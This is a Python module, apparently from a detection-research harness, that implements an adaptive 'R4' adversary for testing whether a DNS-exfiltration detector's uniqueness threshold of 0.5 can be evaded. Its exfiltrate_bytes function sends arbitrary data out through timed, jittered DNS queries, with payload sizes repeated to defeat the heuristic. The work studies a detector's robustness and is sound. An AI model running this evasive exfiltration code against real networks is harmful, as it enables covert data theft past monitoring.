#!/usr/bin/env python3
"""
T4-variant R4 — Adversario consciente do detector (evasao de H4).

ups repete cada valor 2 vezes consecutivas antes de trocar. Valores
novos sao sorteados como em R1 (uniform [512, 4096]).

Razao de unicidade alvo: ~0.5 (N/2 valores unicos em N total).
Threshold de H4 = 0.5 (estritamente >, nao >=); regime testa se
threshold sobrevive a esse ataque adaptativo.

Resultado critico: se H4 disparar consistentemente em R4, threshold
0.5 e robusto. Se nao disparar, registra-se limitacao para
recalibracao futura (ou exige-se heuristica complementar — e.g.,
entropia da sequencia, jitter intra-sessao).
"""

import random
from techniques.t4_variant_base import exfiltrate, payload_to_n_queries


REPEAT = 2  # cada ups aparece exatamente REPEAT vezes antes de trocar


def gen_ups_sequence(n_queries: int) -> list:
    seq = []
    while len(seq) < n_queries:
        val = random.randint(512, 4096)
        for _ in range(REPEAT):
            if len(seq) >= n_queries:
                break
            seq.append(val)
    return seq[:n_queries]


def exfiltrate_bytes(data: bytes, domain: str,
                     dns_server: str,
                     src_port: int = None,
                     interval: float = 0.04,
                     jitter: float = 0.02) -> int:
    if src_port is None:
        src_port = random.randint(10000, 60000)
    n = payload_to_n_queries(len(data))
    seq = gen_ups_sequence(n)
    return exfiltrate(seq, domain, dns_server, src_port,
                      interval=interval, jitter=jitter)
